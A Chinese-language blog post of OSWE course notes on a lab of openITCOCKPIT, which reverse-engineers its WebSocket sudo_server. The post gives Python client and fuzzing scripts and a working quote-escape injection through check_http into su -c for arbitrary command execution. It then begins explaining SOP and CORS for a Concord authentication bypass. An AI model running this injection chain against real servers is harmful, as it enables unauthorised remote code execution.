---
title: "[OSWE, WEB-300] Instructional notes - Part 4"
date: 2026-05-11
author: "CHW"
tags:
  - offsec
description: "OSWE WEB-300 筆記 Part 4，涵蓋 Websocket client、Concord 身份繞過到 RCE、Same-Origin Policy (SOP)、Cross-Origin Resource Sharing (CORS)、SameSite、CORS+CSRF、DatabaseModule API Leak 等等。"
---

[OSWE, WEB-300] Instructional notes - Part 4
===


# Table of Contents
[TOC]

# [Link back to: "[OSWE, WEB-300] Instructional notes - Part 1"](https://chw41.github.io/b1og/oswe-web-300-instructional-notes---part-1/)
# [Link back to: "[OSWE, WEB-300] Instructional notes - Part 2"](https://chw41.github.io/b1og/oswe-web-300-instructional-notes---part-2/)
# [Link back to: "[OSWE, WEB-300] Instructional notes - Part 3"](https://chw41.github.io/b1og/oswe-web-300-instructional-notes---part-3/)

>[!Caution]
> 接續 [[OSWE, WEB-300] Instructional notes - Part 3](https://chw41.github.io/b1og/oswe-web-300-instructional-notes---part-3/) 內容

# openITCOCKPIT XSS and OS Command Injection - Blackbox
## ...
## RCE Hunting
### ...
### Reading and Understanding the JavaScript
透過執行 new [WebSocket](https://developer.mozilla.org/en-US/docs/Web/API/WebSocket) 來使用 JavaScript 發起 WebSocket communicaton 。搜尋文件尋找有關 `sudo_server` WebSocket 的設定

手動檢查找到了 `components.js` L1248-1331 定義 WebsocketSudoComponent 的 component 以及傳送訊息、解析回應和管理進出 WebSocket 伺服器的資料的函數：
```javascript
1248  App.Components.WebsocketSudoComponent = Frontend.Component.extend({
...
1273      send: function(json, connection) {
1274          connection = connection || this._connection;
1275          connection.send(json)
1276      },
...
1331  });
```

WebsocketSudoComponent 也定義了向 WebSocket 伺服器發送訊息的函數: 透過搜尋所有對 `.send()` 函數的呼叫
```
┌──(chw💲CHW)-[~/scripts/content/custom_js]
└─$ grep -r  "send(" ./ --exclude="compressed*"
./pretty/angular_services.js: _send(JSON.stringify({
./pretty/angular_services.js: _send(JSON.stringify({
./pretty/angular_services.js: _connection.send(json)
./pretty/angular_services.js: _send(json)
./pretty/angular_services.js: _send(JSON.stringify({
./pretty/angular_services.js: _connection.send(json)
./pretty/angular_services.js: _send(json)
./pretty/components.js:  connection.send(json)
./pretty/components.js:  this.send(this.toJson('requestUniqId', ''))
./pretty/components.js:  this.send(this.toJson('keepAlive', ''))
./pretty/components.js:  this._connection.send(jsonArr);
./pretty/controllers.js: self.WebsocketSudo.send(self.WebsocketSudo.toJson('5238f8e57e72e81d44119a8ffc3f98ea', {
./pretty/controllers.js: self.WebsocketSudo.send(self.WebsocketSudo.toJson('package_uninstall', {
./pretty/controllers.js: self.WebsocketSudo.send(self.WebsocketSudo.toJson('package_install', {
./pretty/controllers.js: self.WebsocketSudo.send(self.WebsocketSudo.toJson('d41d8cd98f00b204e9800998ecf8427e', {
./pretty/controllers.js: self.WebsocketSudo.send(self.WebsocketSudo.toJson('apt_get_update', ''))
./pretty/controllers.js: this.WebsocketSudo.send(this.WebsocketSudo.toJson('nagiostats', []))
...
./pretty/angular_directives.js:  SudoService.send(SudoService.toJson('enableOrDisableHostFlapdetection', [object.Host.uuid, 1]))
./pretty/angular_directives.js:  SudoService.send(SudoService.toJson('enableOrDisableHostFlapdetection', [object.Host.uuid, 0]))
...
```
輸出結果顯示了一系列有用的 command，移除誤報、清理程式碼並刪除重複值後，整理出命令清單
```
./pretty/components.js:         requestUniqId
./pretty/components.js:         keepAlive
./pretty/controllers.js:        5238f8e57e72e81d44119a8ffc3f98ea
./pretty/controllers.js:        package_uninstall
./pretty/controllers.js:        package_install
./pretty/controllers.js:        d41d8cd98f00b204e9800998ecf8427e
./pretty/controllers.js:        apt_get_update
./pretty/controllers.js:        nagiostats
./pretty/controllers.js:        execute_nagios_command
./pretty/angular_directives.js: sendCustomHostNotification
./pretty/angular_directives.js: submitHoststateAck
./pretty/angular_directives.js: submitEnableServiceNotifications
./pretty/angular_directives.js: commitPassiveResult
./pretty/angular_directives.js: sendCustomServiceNotification
./pretty/angular_directives.js: submitDisableServiceNotifications
./pretty/angular_directives.js: submitDisableHostNotifications
./pretty/angular_directives.js: enableOrDisableServiceFlapdetection
./pretty/angular_directives.js: rescheduleService
./pretty/angular_directives.js: submitServiceDowntime
./pretty/angular_directives.js: submitHostDowntime
./pretty/angular_directives.js: commitPassiveServiceResult
./pretty/angular_directives.js: submitEnableHostNotifications
./pretty/angular_directives.js: submitServicestateAck
./pretty/angular_directives.js: rescheduleHost
./pretty/angular_directives.js: enableOrDisableHostFlapdetection
```
> - controllers.js 中列出的命令高機率是在執行系統級命令

另外 `execute_nagios_command` 指令可能會觸發某種形式的指令執行\
開啟 controllers.js 檔案搜尋 `execute_nagios_command`:
```javascript
loadConsole: function() {
    this.$jqconsole = $('#console').jqconsole('', 'nagios$ ');
    this.$jqconsole.Write(this.getVar('console_welcome'));
    var startPrompt = function() {
        var self = this;
        self.$jqconsole.Prompt(!0, function(input) {
            self.WebsocketSudo.send(self.WebsocketSudo.toJson('execute_nagios_command', input));
            startPrompt()
        })
    }.bind(this);
    startPrompt()
},
```
> loadConsole 函數中引用了 jqconsole。透過「execute_nagios_command」直接傳遞輸入，可以得知 [jqconsole](https://github.com/replit-archive/jq-console) 是一個jQuery terminal plugin

流程解讀：
```
使用者在 jqconsole 輸入什麼
→ 直接當 data
→ 送到 sudo_server
→ task = execute_nagios_command
```

```javascript
4691 self.WebsocketSudo.send(self.WebsocketSudo.toJson('execute_nagios_command', input));
```
controller.js  L4691 呼叫 execute_nagios_command 並傳入一個輸入，傳遞給 toJson 的函式\
分析一下 toJson 函數的作用: 首先找到該函數的定義位置
```
┌──(chw💲CHW)-[~/scripts/content/custom_js]
└─$ grep -r  "toJson" ./ --exclude="compressed*" | grep -v ".send"
./components.js:    toJson: function(task, data) {
./angular_services.js:        toJson: function(task, data) {
./angular_services.js:        toJson: function(task, data) {
```
> toJson 在 `angular_services.js` 和 `components.js` 中均有定義
 
在 components.js 中查看 toJson
```javascript=1310
toJson: function(task, data) {
    var jsonArr = [];
    jsonArr = JSON.stringify({
        task: task,
        data: data,
        uniqid: this._uniqid,
        key: this._key
    });
    return jsonArr
},
```
`toJson`函數接受兩個參數：
1. task（`execute_nagios_command`）
2. 某種形式的 data（`input`）
 
該函數隨後會建立一個 JSON 字串，其中包含 task 、data、unique id 和 key。目前已知 task 和 data 的來源，但必須確定 unique id 和 key 的來源\
繼續搜尋可以發現，unique id 是在 `toJson` 函數上方的 `_onResponse`的函數中定義的：
```javasscript=1283
_onResponse: function(e) {
    var transmitted = JSON.parse(e.data);
    switch (transmitted.type) {
        case 'connection':
            this._uniqid = transmitted.uniqid;
            this.__success(e);
            break;
        case 'response':
            if (this._uniqid === transmitted.uniqid) {
                this._callback(transmitted)
            }
            break;
        case 'dispatcher':
            this._dispatcher(transmitted);
            break;
        case 'event':
            if (this._uniqid === transmitted.uniqid) {
                this._event(transmitted)
            }
            break;
        case 'keepAlive':
            break
    }
}
```
> 可以得知 `_onResponse` 函數會在收到訊息時執行:
> - `uniqid` 被設定為伺服器提供的值。猜測在連線期間的某個時間點，伺服器會發送一個 `uniqid` 值\
> 伺服器似乎也會發送五種類型的回應：`connection`、`response`、 `dispatcher`、`event` 和`keepAlive`

`_key` 的來源，在 components.js 的 setup 函式有一些線索：
```javascript=1260
setup: function(wsURL, key) {
    this._wsUrl = wsURL;
    this._key = key
},
```
呼叫 setup 函數時，WebSocket URL 和 WebsocketSudo component 中的 `_key` 變數會被設定\
用grep 尋找對該函數的呼叫：
```
┌──(chw💲CHW)-[~/scripts/content/custom_js]
└─$ grep -r  "setup(" ./ --exclude="compressed*"
...
./pretty/controllers.js:    _setupChatListFilter: function() {
./app_controller.js:        this.ImageChooser.setup(this._dom);
./app_controller.js:  this.FileChooser.setup(this._dom);
./app_controller.js:      this.WebsocketSudo.setup(this.getVar('websocket_url'), this.getVar('akey'));
```
> `this.WebsocketSudo.setup(this.getVar('websocket_url'), this.getVar('akey'));`

搜尋 `setup()` 顯示很多函數調用，但 `this.WebsocketSudo.setup(this.getVar('websocket_url'), this.getVar('akey'));` 傳入的參數看起來很熟悉 (在commands.html 檔案中設定過)\
已經具備建置 execute_nagios_command 任務所需的條件。不過還需要檢查與 WebSocket 伺服器的初始連線過程:
> 可以透過 components.js 的 connect 函數當作檢查點

```javascript=1264
connect: function() {
    if (this._connection === null) {
        this._connection = new WebSocket(this._wsUrl)
    }
    this._connection.onopen = this._onConnectionOpen.bind(this);
    this._connection.onmessage = this._onResponse.bind(this);
    this._connection.onerror = this._onError.bind(this);
    return this._connection
},
```
connect 會先在 WebSocket 連線不存在時建立一個新的連線，接著設定 `onopen`、`onmessage` 和 `onerror` event 處理程序\
onopen event handler 會呼叫 `_onConnectionOpen` 函數:
```javascript=1277
_onConnectionOpen: function(e) {
    this.requestUniqId()
},
...
requestUniqId: function() {
    this.send(this.toJson('requestUniqId', ''))
},
```
`_onConnectionOpen` 函數只會呼叫 requestUniqId 函數， requestUniqId 會向伺服器傳送一個請求，請求一個 unique id

###  Interacting With the WebSocket Server
了解 WebSocket 請求後，可以測試與伺服器互動了
>[!Note]
> 雖然 Burp 可以與 WebSocket 伺服器交互，但 UI 不適合環境的需求
> >將使用 Python 建立自己的 client

### Building a Client
首先寫一個腳本，允許連接伺服器並發送任何命令作為「輸入」，讓我們導入所需的 modules 並設定 global variables

- 使用 websocket module 與 Server 溝通
- ssl module 告知 WebSocket 伺服器忽略無效證書
- json module 建置和解析請求和回應
- argparse module 允許 command line 參數
- thread module 在後台執行某些 task (已知每個請求都會發送 unique id 和 key 因此定義為 global variables

```python
import websocket
import ssl 
import json
import argparse
import _thread as thread

uniqid = ""
key = ""
```
設定 arguments
```python
if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    parser.add_argument('--url', '-u',
                        required=True,
                        dest='url',
                        help='Websocket URL')
    parser.add_argument('--key', '-k',
                        required=True,
                        dest='key',
                        help='openITCOCKPIT Key')
    parser.add_argument('--verbose', '-v',
                        help='Print more data',
                        action='store_true')
    args = parser.parse_args()
```
> - URL 和 key 配置與 WebSocket server 連線

```python
    key = args.key
    websocket.enableTrace(args.verbose)
    ws = websocket.WebSocketApp(args.url,
                              on_message = on_message,
                              on_error = on_error,
                              on_close = on_close,
                              on_open = on_open)
    ws.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE})
```
將 global variables key 設定為參數中傳入的值。接著若參數已設置，我們將設置 verbose tracing 並配置連接： 傳入 URL 並設定 event 執行WebSocketApp 中所需的函數，並定義四個函數（`on_message`、`on_error`、`on_close` 和 `on_open`），最後指定 WebSocket client 保持持續連線

接著定義四個函數來處理這些 event:
- `on_open`:  
WebSocket 連線成功建立時會被呼叫\
由於希望連線保持開啟，同時仍然可以持續接收 server 傳回的訊息，因此在 `on_open` 中建立一個新的 thread，會不斷等待使用者輸入，並將輸入內容包裝成與官方 client 相同格式的 JSON，接著透過 WebSocket connection 送到 server
```python
def on_open(ws):
    def run():
        while True:
            cmd = input()
            ws.send(toJson("execute_nagios_command", cmd))
    thread.start_new_thread(run, ())
```
- `toJson`:  
這個函數用來模仿官方 JavaScript client 的 `toJson()`\
會接收 `task` 和 `data` 兩個參數，並把目前的 `uniqid` 和 `key` 一起包成 JSON 字串，環境範例中主要使用的 task 是 `execute_nagios_command` 而 data 使用者輸入的指令內容
```python
def toJson(task, data):
    req = {
        "task": task,
        "data": data,
        "uniqid": uniqid,
        "key": key
    }
    return json.dumps(req)
```
- `on_error`:  
當 WebSocket 連線發生錯誤會被呼叫\
單純把錯誤訊息印出，方便 debug
```python
def on_error(ws, error):
    print(error)
```
- `on_close`:  
當 WebSocket 連線被關閉會被呼叫\
```python
def on_close(ws):
    print("[+] Connection Closed")
```
(完整 wsclient.py)
```python
#!/usr/bin/env python3

import websocket
import ssl
import json
import argparse
import _thread as thread

uniqid = ""
key = ""


def toJson(task, data):
    req = {
        "task": task,
        "data": data,
        "uniqid": uniqid,
        "key": key
    }
    return json.dumps(req)


def on_open(ws):
    def run():
        while True:
            cmd = input()
            ws.send(toJson("execute_nagios_command", cmd))
    thread.start_new_thread(run, ())


def on_message(ws, message):
    global uniqid

    mes = json.loads(message)

    if "uniqid" in mes.keys():
        uniqid = mes["uniqid"]

    print(mes)


def on_error(ws, error):
    print(error)


def on_close(ws):
    print("[+] Connection Closed")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    parser.add_argument("--url", "-u",
                        required=True,
                        dest="url",
                        help="Websocket URL")

    parser.add_argument("--key", "-k",
                        required=True,
                        dest="key",
                        help="openITCOCKPIT Key")

    parser.add_argument("--verbose", "-v",
                        help="Print more data",
                        action="store_true")

    args = parser.parse_args()

    key = args.key

    websocket.enableTrace(args.verbose)

    ws = websocket.WebSocketApp(
        args.url,
        on_message=on_message,
        on_error=on_error,
        on_close=on_close,
        on_open=on_open
    )

    ws.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE})
```
嘗試連線：
```
┌──(chw💲CHW)-[~/Offsec/OSWE/openitcockpit]
└─$ python3 wsclient.py --url wss://openitcockpit/sudo_server -k 1fea123e07f730f76e661bced33a94152378611e -v
--- request header ---
GET /sudo_server HTTP/1.1
Upgrade: websocket
Connection: Upgrade
Host: openitcockpit
Origin: http://openitcockpit
Sec-WebSocket-Key: 5E+Srv82go8K6QOoJ6WRUQ==
Sec-WebSocket-Version: 13


-----------------------
--- response header ---
HTTP/1.1 101 Switching Protocols
Server: nginx
Date: Fri, 21 Feb 2020 16:36:31 GMT
Connection: upgrade
Upgrade: websocket
Sec-WebSocket-Accept: R4BpxrINRQ/cDOErqo4rbxfliaI=
X-Powered-By: Ratchet/0.4.1
-----------------------
{'payload': 'Connection established', 'type': 'connection', 'task': '', 'uniqid': '5e50070feeac73.88569350'}
whoami
send: b'\x81\xf5\x8b\xc1\xa3\x9e\xf0\xe3\xd7\xff\xf8\xaa\x81\xa4\xab\xe3\xc6\xe6\xee\xa2\xd6\xea\xee\x9e\xcd\xff\xec\xa8\xcc\xed\xd4\xa2\xcc\xf3\xe6\xa0\xcd\xfa\xa9\xed\x83\xbc\xef\xa0\xd7\xff\xa9\xfb\x83\xbc\xfc\xa9\xcc\xff\xe6\xa8\x81\xb2\xab\xe3\xd6\xf0\xe2\xb0\xca\xfa\xa9\xfb\x83\xbc\xa9\xed\x83\xbc\xe0\xa4\xda\xbc\xb1\xe1\x81\xaf\xed\xa4\xc2\xaf\xb9\xf2\xc6\xae\xbc\xa7\x94\xad\xbb\xa7\x94\xa8\xee\xf7\x95\xaf\xe9\xa2\xc6\xfa\xb8\xf2\xc2\xa7\xbf\xf0\x96\xac\xb8\xf6\x9b\xa8\xba\xf0\xc6\xbc\xf6'
{'payload': '\x1b[0;31mERROR: Forbidden command!\x1b[0m\n', 'type': 'response', 'task': '', 'uniqid': '', 'category': 'notification'}
{'type': 'dispatcher', 'running': False}
{'type': 'dispatcher', 'running': False}
^C
send: b'\x88\x829.J.:\xc6'
[+] Connection Closed
```
> WebSocket server 在連線建立後會回傳 `type` 為 `connection` 的訊息，payload 為 `Connection established`\
> 接著送出 `whoami` server 回應 `Forbidden command!`，代表該 command 被後端限制\
> 且 server 會週期性送出 `dispatcher` 類型的訊息，但這類訊息沒有 payload，對測試沒有幫助\

因此修改 `on_message` 函數，讓輸出更乾淨：
- 若 message type 是 `connection`，只印出 `[+] Connected!`
- 若 message type 是 `dispatcher`，直接忽略
- 若 message type 是 `response`，只印出 `payload`
- 其他未知類型印出完整 message

因為函數內會修改全域變數 `uniqid`，所以應該加上 `global uniqid`
```python
def on_message(ws, message):
    mes = json.loads(message)

    if "uniqid" in mes.keys():
        uniqid = mes["uniqid"]
    
    if mes["type"] == "connection":
        print("[+] Connected!")
    elif mes["type"] == "dispatcher":
        pass
    elif mes["type"] == "response":
        print(mes["payload"], end = '')
    else:
        print(mes)
```
(修改後完整 wsclient_final.py)
```pyhton
#!/usr/bin/env python3

import websocket
import ssl
import json
import argparse
import _thread as thread

uniqid = ""
key = ""


def toJson(task, data):
    req = {
        "task": task,
        "data": data,
        "uniqid": uniqid,
        "key": key
    }
    return json.dumps(req)


def on_open(ws):
    def run():
        while True:
            cmd = input()
            ws.send(toJson("execute_nagios_command", cmd))

    thread.start_new_thread(run, ())


def on_message(ws, message):
    global uniqid

    mes = json.loads(message)

    if "uniqid" in mes.keys():
        uniqid = mes["uniqid"]

    if mes["type"] == "connection":
        print("[+] Connected!")
    elif mes["type"] == "dispatcher":
        pass
    elif mes["type"] == "response":
        print(mes["payload"], end='')
    else:
        print(mes)


def on_error(ws, error):
    print(error)


def on_close(ws, *args):
    print("[+] Connection Closed")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    parser.add_argument("--url", "-u",
                        required=True,
                        dest="url",
                        help="Websocket URL")

    parser.add_argument("--key", "-k",
                        required=True,
                        dest="key",
                        help="openITCOCKPIT Key")

    parser.add_argument("--verbose", "-v",
                        help="Print more data",
                        action="store_true")

    args = parser.parse_args()

    key = args.key

    websocket.enableTrace(args.verbose)

    ws = websocket.WebSocketApp(
        args.url,
        on_message=on_message,
        on_error=on_error,
        on_close=on_close,
        on_open=on_open
    )

    ws.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE})
```
嘗試執行：
```
┌──(chw💲CHW)-[~/Offsec/OSWE/openitcockpit]
└─$ python3 wsclient_final.py --url wss://openitcockpit/sudo_server -k 1fea123e07f730f76e661bced33a94152378611e
[+] Connected!
whoami
ERROR: Forbidden command!
^C
[+] Connection Closed
```
現在已經有乾淨的互動式 WebSocket client，🥚 仍須測試哪些輸入會被後端接受:\
從 `whoami` 被拒絕可以推測，`execute_nagios_command` 並不是直接執行任意系統指令，而是後端有某種 command validation 或 allowlist
🧠：fuzz 常見 command，找出哪些 command 被允許\
建立 wordlist 檢查 response 是否包含 `Forbidden command`

首先建立 fuzz.py
```python
#!/usr/bin/env python3

import websocket
import ssl
import json
import argparse
import time

uniqid = ""
key = ""
commands = []
index = 0


def toJson(task, data):
    req = {
        "task": task,
        "data": data,
        "uniqid": uniqid,
        "key": key
    }
    return json.dumps(req)


def send_next(ws):
    global index

    if index >= len(commands):
        print("[+] Fuzzing completed")
        ws.close()
        return

    cmd = commands[index].strip()
    index += 1

    if cmd == "":
        send_next(ws)
        return

    print(f"[>] Testing: {cmd}")
    ws.send(toJson("execute_nagios_command", cmd))


def on_message(ws, message):
    global uniqid

    mes = json.loads(message)

    if "uniqid" in mes.keys():
        uniqid = mes["uniqid"]

    if mes["type"] == "connection":
        print("[+] Connected!")
        time.sleep(0.2)
        send_next(ws)

    elif mes["type"] == "dispatcher":
        pass

    elif mes["type"] == "response":
        payload = mes.get("payload", "")

        if "Forbidden command" not in payload:
            print("[+] Possible allowed command found")
            print(payload, end="")

        time.sleep(0.2)
        send_next(ws)

    else:
        print(mes)


def on_error(ws, error):
    print(error)


def on_close(ws, *args):
    print("[+] Connection Closed")


def on_open(ws):
    pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    parser.add_argument("--url", "-u",
                        required=True,
                        dest="url",
                        help="Websocket URL")

    parser.add_argument("--key", "-k",
                        required=True,
                        dest="key",
                        help="openITCOCKPIT Key")

    parser.add_argument("--wordlist", "-w",
                        required=True,
                        dest="wordlist",
                        help="Command wordlist")

    args = parser.parse_args()

    key = args.key

    with open(args.wordlist, "r") as f:
        commands = f.readlines()

    ws = websocket.WebSocketApp(
        args.url,
        on_message=on_message,
        on_error=on_error,
        on_close=on_close,
        on_open=on_open
    )

    ws.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE})
```

建立 wordlist
```
┌──(chw💲CHW)-[~/Offsec/OSWE/openitcockpit]
└─$ cat > commands.txt << 'EOF'
ls
pwd
id
whoami
hostname
date
uname
cat
echo
ps
netstat
ss
curl
wget
nc
bash
sh
python
perl
php
EOF
```
![image](https://hackmd.io/_uploads/S1l_6cpRZx.png)

執行 fuzz.py 找出
```
┌──(chw💲CHW)-[~/Offsec/OSWE/openitcockpit]
└─$ python3 fuzz.py \
  --url wss://openitcockpit/sudo_server \
  -k 1fea123e07f730f76e661bced33a94152378611e \
  -w commands.txt
```
> `ls` 可執行
### Digging Deeper
目前已經確認一般 command injection payload 都沒有成功\
代表後端並不是單純把輸入直接丟進 shell 執行，有做 command filtering 或 allowlist

利用 `find` 參數 `-exec` 可以找到檔案後執行指定 command\
不過目前只知道 `ls` 可執行
```
┌──(chw💲CHW)-[~/Offsec/OSWE/openitcockpit]
└─$ python3 wsclient.py --url wss://openitcockpit/sudo_server -k 1fea123e07f730f76e661bced33a94152378611e
[+] Connected!
ls
...
check_hpjd
check_http
check_icmp
...
./check_http
check_http: Could not parse arguments
Usage:
 check_http -H <vhost> | -I <IP-address> [-u <uri>] [-p <port>]
       [-J <client certificate file>] [-K <private key>]
       [-w <warn time>] [-c <critical time>] [-t <timeout>] [-L] [-E] [-a auth]
       [-b proxy_auth] [-f <ok|warning|critcal|follow|sticky|stickyport>]
       [-e <expect>] [-d string] [-s string] [-l] [-r <regex> | -R <case-insensitive regex>]
       [-P string] [-m <min_pg_size>:<max_pg_size>] [-4|-6] [-N] [-M <age>]
       [-A string] [-k string] [-S <version>] [--sni] [-C <warn_age>[,<crit_age>]]
       [-T <content-type>] [-j method]
```
> -  `ls` 目前目錄下有許多 script / binary\
> - `check_http` 允許 `-k` 參數加入自訂 HTTP header 
>> ‼️ 若可以控制目標 IP、port 及 header 內容，就可能利用它和本機服務互動，甚至觸發 argument injection

(開啟監聽 port)
```
┌──(chw💲CHW)-[~/Offsec/OSWE/openitcockpit]
└─$ nc -nvlp 8080
[2026-05-10 02:19:14] nc -nvlp 8080
listening on [any] 8080 ...

```
- 讓 openITCOCKPIT 透過 `check_http` 連回 Kali：
```
┌──(chw💲CHW)-[~/Offsec/OSWE/openitcockpit]
└─$ python3 wsclient.py --url wss://openitcockpit/sudo_server -k 1fea123e07f730f76e661bced33a94152378611e
[+] Connected!
./check_http -I {Kali IP} -p 8080
CRITICAL - Socket timeout after 10 seconds
```
(監聽 port 成功收到)
```
┌──(chw💲CHW)-[~/Offsec/OSWE/openitcockpit]
└─$ nc -nvlp 8080
[2026-05-10 02:19:14] nc -nvlp 8080
listening on [any] 8080 ...
connect to [{Kali IP}] from (UNKNOWN) [192.168.231.129] 34448
GET / HTTP/1.0
User-Agent: check_http/v2.1.1 (monitoring-plugins 2.1.1)
Connection: close
```
- 接著嘗試 `-k` 是否能控制 header：
```
./check_http -I {Kali IP} -p 8080 -k string1
```
(Kali)
```
┌──(chw💲CHW)-[~/Offsec/OSWE/openitcockpit]
└─$ nc -nvlp 8080
[2026-05-10 02:29:34] nc -nvlp 8080
listening on [any] 8080 ...
connect to [{Kali IP}] from (UNKNOWN) [192.168.231.129] 34448
GET / HTTP/1.0
User-Agent: check_http/v2.1.1 (monitoring-plugins 2.1.1)
Connection: close
string1
```
> 證明 `-k` 的值會被加入 request header

- 測試包含空白與 quote 的輸入：
```
./check_http -I {Kali IP} -p 8080 -k "string1 string2"
```
(Kali)
```
listening on [any] 8080 ...
connect to [{Kali IP}] from (UNKNOWN) [192.168.231.129] 34448
GET / HTTP/1.1
User-Agent: check_http/v2.1.1 (monitoring-plugins 2.1.1)
Connection: close
Host: string2":8080
"string1
```
> 第一段和第二段被拆開被放進 Host header

- 測試 single quote 
```
./check_http -I {Kali IP} -p 8080 -k 'string1 string2'
```
(Kali)
```
listening on [any] 8080 ...
connect to [{Kali IP}] from (UNKNOWN) [192.168.231.129] 34448
GET / HTTP/1.0
User-Agent: check_http/v2.1.1 (monitoring-plugins 2.1.1)
Connection: close
string1
```
> 收到 `string1`、`string2` 消失
> 不一致可能代表送入的 quote 影響後端 command construction

確認是否 escape 到外層 command，把 `string2` 換成 `--help`：
```
┌──(chw💲CHW)-[~/Offsec/OSWE/openitcockpit]
└─$ python3 wsclient.py --url wss://openitcockpit/sudo_server -k 1fea123e07f730f76e661bced33a94152378611e
[+] Connected!
./check_http -I {Kali IP} -p 8080 -k 'string1 --help'     
Usage: su [options] [LOGIN]

Options:
  -c, --command COMMAND         pass COMMAND to the invoked shell
  -h, --help                    display this help message and exit
  -, -l, --login                make the shell a login shell
  -m, -p,
  --preserve-environment        do not reset environment variables, and
                                keep the same shell
  -s, --shell SHELL             use SHELL instead of the default in passwd
```
> ‼️ 不是單純控制 `check_http` 的 argument，而是成功影響到外層的 `su` command

可以推測後端可能組出類似以下 command：
```
su someuser -c './check_http -I {Kali IP} -p 8080 -k 'test --help''
```
目前使用者輸入被包在 single quote 裡，所以當我們在 `-k` 裡插入 single quote，就能跳出原本的 command 字串，進而注入到 `su` 的參數層\

🧠：既然 `su` 使用 `-c` 指定要執行的 command，我們可以嘗試再塞入第二個 `-c`
```
./check_http -I {Kali IP} -p 8080 -k 'test -c 'echo 'hacked'
```
> 成功輸出 `hacked`，代表第二個 `-c` 被執行\
> filter bypass 的關鍵

因此利用邏輯變成：
```
execute_nagios_command
  ↓
後端檢查 command 是否允許
  ↓
./check_http 通過 allowlist
  ↓
-k 參數中的 single quote 跳出原本字串
  ↓
注入第二個 su -c
  ↓
執行任意 command
```
修改成最終版  wsclient.py
```python
#!/usr/bin/env python3

import websocket
import ssl
import json
import argparse
import _thread as thread

uniqid = ""
key = ""


def toJson(task, data):
    return json.dumps({
        "task": task,
        "data": data,
        "uniqid": uniqid,
        "key": key
    })


def on_open(ws):
    def run():
        while True:
            cmd = input()
            ws.send(toJson("execute_nagios_command", cmd))

    thread.start_new_thread(run, ())


def on_message(ws, message):
    global uniqid

    try:
        mes = json.loads(message)
    except Exception:
        print(message)
        return

    if "uniqid" in mes.keys():
        uniqid = mes["uniqid"]

    if mes.get("type") == "connection":
        print("[+] Connected!")
    elif mes.get("type") == "dispatcher":
        pass
    elif mes.get("type") == "response":
        print(mes.get("payload", ""), end="")
    else:
        print(mes)


def on_error(ws, error):
    print(f"[-] Error: {error}")


def on_close(ws, close_status_code=None, close_msg=None):
    print("[+] Connection Closed")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    parser.add_argument("--url", "-u",
                        required=True,
                        dest="url",
                        help="WebSocket URL")

    parser.add_argument("--key", "-k",
                        required=True,
                        dest="key",
                        help="openITCOCKPIT Key")

    parser.add_argument("--verbose", "-v",
                        help="Print more data",
                        action="store_true")

    args = parser.parse_args()

    key = args.key

    websocket.enableTrace(args.verbose)

    ws = websocket.WebSocketApp(
        args.url,
        on_message=on_message,
        on_error=on_error,
        on_close=on_close,
        on_open=on_open
    )

    ws.run_forever(
        sslopt={
            "cert_reqs": ssl.CERT_NONE,
            "check_hostname": False
        }
    )
```
執行：
```
python3 wsclient.py \
  --url wss://openitcockpit/sudo_server \
  -k 1fea123e07f730f76e661bced33a94152378611e
```
```
cmd> whoami
```
# Concord Authentication Bypass to RCE
現代 Web Application 通常會搭配 CI/CD、workflow server、orchestration hub 自動化部署系統

這類系統負責：
- 自動 build
- 測試
- deployment
- 呼叫 API
- 執行 deployment workflow

因此這些 workflow server 通常擁有：
- Dev 環境存取權
- QA 環境存取權
- Production 環境存取權

一旦被攻擊者拿下，通常可以直接取得整個企業環境的高權限控制。

環境範例目標是 WalMart 開源的 workflow server：Concord

Concord 存在三個 Authentication Bypass：
1. 過度寬鬆的 CORS 設定
2. CSRF 漏洞
3. 預設帳號 + undocumented API key

其中：
- 第一個漏洞由 Rob Fitzpatrick 發現
- 第二與第三個漏洞由 Offensive Security 發現

攻擊流程：
```
CORS Information Disclosure
        ↓
CSRF
        ↓
Authentication Bypass
        ↓
RCE
```
環境範例:
- HTTP
http://concord:8001/
![image](https://hackmd.io/_uploads/SyIJXnTCWe.png)

- SSH
`student`:`studentlab`\
![image](https://hackmd.io/_uploads/SJPQXna0Wg.png)

使用 dirb 目錄爆破：
```
┌──(chw💲CHW)-[~/Offsec/OSWE/concord]
└─$ dirb http://concord:8001
```
![image](https://hackmd.io/_uploads/Sy_Yo2aRbg.png)
> `/api`, `/forms`, `/logs`, `/docs`, `/static`

查看 Burp: /whoami API\
![image](https://hackmd.io/_uploads/H1jB32aRWx.png)
> `Access-Control` header 代表 Server 有啟用 Cross-Origin Resource Sharing (CORS)

## Authentication Bypass: Round One - CSRF and CORS
當發現網站回傳：
```http
Access-Control-*
```
可能：
- 過度寬鬆的 CORS 設定
- 可能允許 attacker 網站直接讀取受害網站資料

尤其當：
- victim 已登入
- browser 自動攜帶 cookie/session

風險會非常高

### Same-Origin Policy (SOP)
>[!Note]
>Same-Origin Policy 詳細介紹可參考 [OSWA Note 1](https://chw41.github.io/b1og/oswa-web-200-instructional-notes---part-1/#same-origin-policy)\
>![image](https://hackmd.io/_uploads/rJNOd-00Wl.png)

Browser 內建的重要安全機制 SOP：\
‼️ 禁止不同 Origin 的 JavaScript 互相讀資料\
SOP 不會阻止 request 發送，阻止的是 JavaScript 讀 response

若沒有 SOP ，任何網站都能：
- 讀 Gmail
- 看銀行資料
- 偷 session data
- 存取已登入網站內容

Ex. Broswer 行爲： `fetch("https://bank.com/account")`\
✓ request 會送
✓ cookie 會帶
✓ response 會收到
✗ JS 無法讀 response
> 因此 Burp 是看得到 request，只是 JS 無法讀 response

存取同源 JS response:\
![image](https://hackmd.io/_uploads/rk5DoWC0bg.png)\
存取外網 example.com:\
![image](https://hackmd.io/_uploads/B1k_jZRCZg.png)

### Cross-Origin Resource Sharing (CORS)
>[!Note]
>Cross-Origin Resource Sharing (CORS) 詳細介紹可參考 [OSWA Note 1](https://chw41.github.io/b1og/oswa-web-200-instructional-notes---part-1/#cross-origin-resource-sharing-cors)\
>![image](https://hackmd.io/_uploads/SyIo3ZRC-x.png)


CORS 本質上是：
Server 主動告訴 Browser ，哪些 Origin 可以跨站讀我的 response
> SOP 的例外機制

